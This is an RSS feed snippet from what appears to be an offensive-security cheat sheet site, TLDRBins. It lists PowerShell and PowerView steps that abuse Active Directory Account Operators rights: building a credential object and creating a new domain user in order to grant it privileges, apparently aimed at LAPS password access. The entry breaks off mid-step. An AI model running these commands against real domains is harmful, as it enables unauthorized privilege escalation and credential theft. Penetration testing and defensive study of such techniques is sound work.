channel.title: Account Operators on TLDRBins
channel.description: Recent content in Account Operators on TLDRBins

item.title: Account Operators
item.description: Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = "<DOMAIN>\<USER>" $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create new user password object $new_user_password = ConvertTo-SecureString <NEW_USER_PASSWORD> -AsPlainText -Force 4. Create new user account # Create a new user New-AdUser <NEW_USER> -enabled $true -accountpassword $new_user_password -Credential $cred # Grant new user privilege (e.
